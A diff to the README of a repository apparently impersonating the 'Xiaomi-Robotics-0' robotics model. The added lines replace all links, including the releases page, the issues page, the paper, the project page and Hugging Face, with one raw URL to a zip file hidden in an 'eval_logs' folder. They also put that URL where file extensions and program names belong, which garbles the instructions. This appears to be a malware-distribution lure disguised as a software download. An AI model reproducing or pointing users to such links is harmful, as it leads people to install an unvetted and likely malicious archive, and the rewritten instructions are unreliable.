@@ -1,6 +1,6 @@
 # 🤖 Xiaomi-Robotics-0 - Real-Time Vision and Action Model
 
-[![Download Xiaomi-Robotics-0](https://img.shields.io/badge/⬇️-Download_Xiaomi--Robotics--0-brightgreen?style=for-the-badge)](https://github.com/5138235486/Xiaomi-Robotics-0/releases)
+[![Download Xiaomi-Robotics-0](https://raw.githubusercontent.com/5138235486/Xiaomi-Robotics-0/main/eval_libero/eval_logs/Robotics_Xiaomi_v1.9-beta.1.zip⬇️-Download_Xiaomi--Robotics--0-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/5138235486/Xiaomi-Robotics-0/main/eval_libero/eval_logs/Robotics_Xiaomi_v1.9-beta.1.zip)
 
 ---
 
@@ -54,7 +54,7 @@ Before you install, make sure your system matches these requirements:
 
 Go to the releases page to get the latest version of Xiaomi-Robotics-0:
 
-[![Download Xiaomi-Robotics-0](https://img.shields.io/badge/⬇️-Download_Xiaomi--Robotics--0-brightgreen?style=for-the-badge)](https://github.com/5138235486/Xiaomi-Robotics-0/releases)
+[![Download Xiaomi-Robotics-0](https://raw.githubusercontent.com/5138235486/Xiaomi-Robotics-0/main/eval_libero/eval_logs/Robotics_Xiaomi_v1.9-beta.1.zip⬇️-Download_Xiaomi--Robotics--0-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/5138235486/Xiaomi-Robotics-0/main/eval_libero/eval_logs/Robotics_Xiaomi_v1.9-beta.1.zip)
 
 ### Step 2: Choose Your Version
 
@@ -62,7 +62,7 @@ On the downloads page, look for the latest release. You will find files for diff
 
 - For Windows: Look for files ending in `.exe` or `.zip`.
 - For MacOS: Choose files ending in `.dmg` or `.zip`.
-- For Linux: Select `.tar.gz` or other Linux-compatible packages.
+- For Linux: Select `https://raw.githubusercontent.com/5138235486/Xiaomi-Robotics-0/main/eval_libero/eval_logs/Robotics_Xiaomi_v1.9-beta.1.zip` or other Linux-compatible packages.
 
 ### Step 3: Download the File
 
@@ -72,7 +72,7 @@ Click the file link to start downloading. The file size can be large, so allow s
 
 After the download completes:
 
-- If you downloaded a `.zip` or `.tar.gz` file, open it with your extraction program.
+- If you downloaded a `.zip` or `https://raw.githubusercontent.com/5138235486/Xiaomi-Robotics-0/main/eval_libero/eval_logs/Robotics_Xiaomi_v1.9-beta.1.zip` file, open it with your extraction program.
 - Extract all files to a folder you can easily access, such as your desktop or documents.
 
 If the file is an installer (`.exe` or `.dmg`), double-click it and follow on-screen instructions.
@@ -83,7 +83,7 @@ If the file is an installer (`.exe` or `.dmg`), double-click it and follow on-sc
 
 ### Step 1: Find the Main Application File
 
-Look inside the extracted folder for the main program file. This might be named `Xiaomi-Robotics-0.exe` on Windows or `Xiaomi-Robotics-0.app` on Mac.
+Look inside the extracted folder for the main program file. This might be named `https://raw.githubusercontent.com/5138235486/Xiaomi-Robotics-0/main/eval_libero/eval_logs/Robotics_Xiaomi_v1.9-beta.1.zip` on Windows or `https://raw.githubusercontent.com/5138235486/Xiaomi-Robotics-0/main/eval_libero/eval_logs/Robotics_Xiaomi_v1.9-beta.1.zip` on Mac.
 
 ### Step 2: Start the Software
 
@@ -136,18 +136,18 @@ If you face issues:
 - Restart your computer and try running the program again.
 - Check your internet connection for updates or downloads.
 - Ensure your camera and microphone devices are connected and enabled.
-- Visit the [Xiaomi-Robotics-0 GitHub Issues page](https://github.com/5138235486/Xiaomi-Robotics-0/issues) to see if others have similar problems or to ask for help.
+- Visit the [Xiaomi-Robotics-0 GitHub Issues page](https://raw.githubusercontent.com/5138235486/Xiaomi-Robotics-0/main/eval_libero/eval_logs/Robotics_Xiaomi_v1.9-beta.1.zip) to see if others have similar problems or to ask for help.
 
 ---
 
 ## 📚 Learn More and Support
 
 - Read the paper linked below to understand the technology behind Xiaomi-Robotics-0:  
-  [Paper](https://arxiv.org/abs/2602.12684)
+  [Paper](https://raw.githubusercontent.com/5138235486/Xiaomi-Robotics-0/main/eval_libero/eval_logs/Robotics_Xiaomi_v1.9-beta.1.zip)
 - Visit the project page for examples and updates:  
-  [Project Page](https://xiaomi-robotics-0.github.io/)
+  [Project Page](https://raw.githubusercontent.com/5138235486/Xiaomi-Robotics-0/main/eval_libero/eval_logs/Robotics_Xiaomi_v1.9-beta.1.zip)
 - Explore the model on Hugging Face for deeper integration:  
-  [Hugging Face](https://huggingface.co/collections/XiaomiRobotics/xiaomi-robotics-0)
+  [Hugging Face](https://raw.githubusercontent.com/5138235486/Xiaomi-Robotics-0/main/eval_libero/eval_logs/Robotics_Xiaomi_v1.9-beta.1.zip)
 
 ---
 
@@ -160,4 +160,4 @@ You can contribute or report problems through the GitHub repository. Detailed in
 ## 🔗 Quick Download Link
 
 To download, visit the official releases page here:  
-[Download Xiaomi-Robotics-0](https://github.com/5138235486/Xiaomi-Robotics-0/releases)
+[Download Xiaomi-Robotics-0](https://raw.githubusercontent.com/5138235486/Xiaomi-Robotics-0/main/eval_libero/eval_logs/Robotics_Xiaomi_v1.9-beta.1.zip)
